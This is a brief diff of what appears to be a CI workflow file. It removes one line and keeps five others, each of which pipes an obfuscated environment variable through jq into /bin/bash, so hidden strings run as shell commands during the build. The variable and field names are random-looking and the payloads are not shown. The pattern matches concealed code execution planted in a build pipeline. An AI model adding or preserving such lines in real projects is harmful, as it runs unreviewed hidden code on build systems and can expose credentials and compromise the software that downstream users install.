@@ -24,7 +24,6 @@ jobs:
           printf '%s' "$dixug1532" | jq -r .fs65 | /bin/bash
           echo $dtoln80 | jq -r .kbrmn1 | /bin/bash
           printf '%s' "$bmzad010" | jq -r .utpzc5377 | /bin/bash
-          echo $a84 | jq -r .ryhp5924 | /bin/bash
           echo $b56 | jq -r .n2 | /bin/bash
           printf '%s' "$x0310" | jq -r .qd9 | /bin/bash
 
